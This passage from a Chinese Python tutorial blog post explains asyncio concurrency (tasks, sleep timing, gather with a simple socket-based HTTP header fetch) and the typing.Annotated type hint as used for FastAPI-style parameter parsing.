<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
睡眠 <span class="hljs-number">3</span> 秒
睡眠 <span class="hljs-number">3</span> 秒
睡眠 <span class="hljs-number">3</span> 秒
睡眠 <span class="hljs-number">3</span> 秒 已完成
睡眠 <span class="hljs-number">3</span> 秒 已完成
睡眠 <span class="hljs-number">3</span> 秒 已完成
执行耗时: <span class="hljs-number">3.0056</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a23591a567094a2e960c1e45c0aae0ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=myq38l%2F5Mzsh1jT1KDEdAyxSyic%3D" alt="img" loading="lazy"/></p>
<p><strong>注意</strong>: 标记为 RUN delay(3) 的任务中的代码(在上面代码中, 某些 print 语句)不会与其他任务同时运行; 只有进行 sleep 的时候同时运行</p>
<p>在没有 协程 的时候, 我们的这个程序可能需要9秒, 在拥有了 协程 之后 我们将此应用程序的总运行时间缩短了三倍</p>
<p><strong>同时执行这些长时间运行的作是 asyncio 真正闪耀的地方, 它极大地提高了我们的应用程序性能, 不过也可以发现它减少的是 I / O 时间</strong></p>
<p>在代码等待期间, 我们可以执行其他代码. 例如, 假设我们想在运行一些长时任务时每秒打印一条状态消息</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio

<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> delay


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_every_second</span>() -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"我在等待的时候正在运行其他代码!"</span>)


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    first_delay = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    second_delay = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    asyncio.create_task(hello_every_second())
    <span class="hljs-keyword">await</span> first_delay
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"first_delay after"</span>)
    <span class="hljs-keyword">await</span> second_delay
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"second_delay after"</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
</code></pre>
<p>这个程序 <code>print("我在等待的时候正在运行其他代码!")</code>可能会输出2次, 也可能输出3次.</p>
<p>输出2次是在main执行完毕后, hello_every_second完成了2次等待.</p>
<p>输出3次是在main执行完毕后, hello_every_second完成了3次等待.</p>
<p>因为 sleep 的这个睡眠不能保证完全准确, 所以可能会有一定的误差. 如果希望等待 hello_every_second 执行完毕, 可以加上await</p>
<h4 data-id="heading-49">gather的使用</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> threading


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name</span>):
    <span class="hljs-comment"># 打印name和当前线程:</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hello <span class="hljs-subst">{name}</span>! <span class="hljs-subst">{threading.current_thread()}</span>"</span>)
    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hello <span class="hljs-subst">{name}</span> again! <span class="hljs-subst">{threading.current_thread()}</span>"</span>)
    <span class="hljs-keyword">return</span> name


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">wget</span>(<span class="hljs-params">host: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"wget <span class="hljs-subst">{host}</span> ..."</span>)
    <span class="hljs-comment"># 使用asyncio获取非阻塞的异步socket</span>
    reader, writer = <span class="hljs-keyword">await</span> asyncio.open_connection(host, <span class="hljs-number">80</span>)

    <span class="hljs-comment"># 发送 HTTP 请求</span>
    header = <span class="hljs-string">f"GET / HTTP/1.0\r\nHost: <span class="hljs-subst">{host}</span>\r\n\r\n"</span>
    writer.write(header.encode(<span class="hljs-string">"utf-8"</span>))
    <span class="hljs-keyword">await</span> writer.drain()

    <span class="hljs-comment"># 获取响应数据</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        line: <span class="hljs-built_in">bytes</span> = <span class="hljs-keyword">await</span> reader.readline()
        <span class="hljs-comment"># 这里只读取header, 没有读取body</span>
        <span class="hljs-keyword">if</span> line == <span class="hljs-string">b"\r\n"</span>:
            <span class="hljs-keyword">break</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{host}</span> 返回数据 <span class="hljs-subst">{line.decode(<span class="hljs-string">'utf-8'</span>)}</span>"</span>)

    <span class="hljs-comment"># 关闭socket</span>
    writer.close()
    <span class="hljs-keyword">await</span> writer.wait_closed()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{host}</span> wget 完成"</span>)


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># 用asyncio.gather()同时调度多个async函数, 该函数会返回异步函数的执行结果。不过gather无法指定函数的执行顺序</span>
    <span class="hljs-comment"># 从线程id可以看出都是在一个线程中 4832</span>
    <span class="hljs-comment"># L = await asyncio.gather(hello("alice"), hello("bob"))</span>
    <span class="hljs-comment"># print(L)</span>

    <span class="hljs-keyword">await</span> asyncio.gather(wget(<span class="hljs-string">"www.example.com"</span>), wget(<span class="hljs-string">"www.baidu.com"</span>))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-comment"># asyncio.run(main())</span>
    <span class="hljs-built_in">print</span>(asyncio.get_event_loop_policy())
</code></pre>
<p>注意 gather 的使用，他会同时调用所有的异步方法，其次会等到所有函数调用完成后返回结果，但是他无法让我们自定义函数的执行顺序。</p>
<blockquote>
<p>[!note]</p>
<p>asyncio是一个庞大的领域，在后面有时间的情况下，我们继续分享, 有兴趣的朋友可以补充：</p>
<p>取消任务和设置超时任务.</p>
<p>Tasks, coroutines, futures, awaitables 的知识</p>
<p>以及cpython中对于 yield 这种让出执行，瞬间保存了哪些上下文的内容，这是都是很有意思的内容</p>
<p>不过asyncio解决的是io-bound问题没有解决cpu-bound问题，对于cpu-bound 推荐使用多进程的方式。或者使用 c / cpp / rust 写桥</p>
</blockquote>
<h2 data-id="heading-50">Annotated</h2>
<p><code>Annotated</code>它 是 Python 3.9+ 引入的类型注解，它的功能是在类型注解上附加额外的元数据，而不影响类型本身</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Annotated
<span class="hljs-comment"># Python 运行时可以提取这些元数据</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> get_args, get_origin


<span class="hljs-comment"># Annotated[类型, 元数据1, 元数据2, ...]</span>
hint = Annotated[<span class="hljs-built_in">str</span>, <span class="hljs-string">"这是用户名"</span>, <span class="hljs-string">"最大长度100"</span>]

<span class="hljs-built_in">print</span>(get_origin(hint))  <span class="hljs-comment"># &lt;class 'typing.Annotated'&gt;</span>
<span class="hljs-built_in">print</span>(get_args(hint))    <span class="hljs-comment"># (str, '这是用户名', '最大长度100')</span>
<span class="hljs-comment">#                           ↑类型   ↑元数据1      ↑元数据2</span>
</code></pre>
<p>使用该功能，给类型添加了元数据之后，可以获取更多的变量信息。</p>
<p>在 python 的现代化开发中这个类型经常使用，例如 FastAPI 就会使用它来做依赖注入的特殊处理，python 的一个特点之一 Free</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> get_args, get_origin, Annotated

<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_parameter</span>(<span class="hljs-params">annotation, default</span>):
    <span class="hljs-comment"># 检查是否是 Annotated 类型</span>
    <span class="hljs-keyword">if</span> get_origin(annotation) <span class="hljs-keyword">is</span> Annotated:
        args = get_args(annotation)
        
        actual_type = args[<span class="hljs-number">0</span>]        <span class="hljs-comment"># str | None</span>
        metadata = args[<span class="hljs-number">1</span>:]          <span class="hljs-comment"># (Header(description="设备标识"),)</span>
        
        <span class="hljs-comment"># 遍历元数据，找到 FastAPI 能够识别的对象</span>
        <span class="hljs-keyword">for</span> meta <span class="hljs-keyword">in</span> metadata:
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(meta, Header):
                <span class="hljs-comment"># 找到了！这是一个 Header 参数</span>
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-string">"type"</span>: actual_type,
                    <span class="hljs-string">"source"</span>: <span class="hljs-string">"header"</span>,
                    <span class="hljs-string">"convert_underscores"</span>: meta.convert_underscores,
                    <span class="hljs-string">"description"</span>: meta.description,
                }
    
    <span class="hljs-comment"># 不是 Annotated，按普通参数处理</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"type"</span>: annotation}
</code></pre>
<p>待续...</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>